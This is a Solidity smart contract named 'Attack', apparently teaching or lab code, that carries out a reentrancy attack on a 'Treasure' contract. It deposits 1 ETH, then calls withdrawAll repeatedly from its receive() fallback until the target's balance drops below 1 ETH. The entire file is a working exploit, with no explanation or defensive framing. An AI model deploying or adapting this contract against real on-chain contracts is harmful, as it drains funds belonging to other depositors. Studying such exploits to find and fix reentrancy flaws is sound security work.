// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

interface ITreasure {
    function deposit() external payable;
    function withdrawAll() external;
}

contract Attack {
    ITreasure public immutable treasure;

    constructor(ITreasure _treasure) {
        treasure = _treasure;
    }

    receive() external payable {
        if (address(treasure).balance >= 1 ether) {
            treasure.withdrawAll();
        }
    }

    function attack () external payable {
        require(msg.value == 1 ether, "Require 1 ETH to attack");
        treasure.deposit{value: 1 ether}();
        treasure.withdrawAll();
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}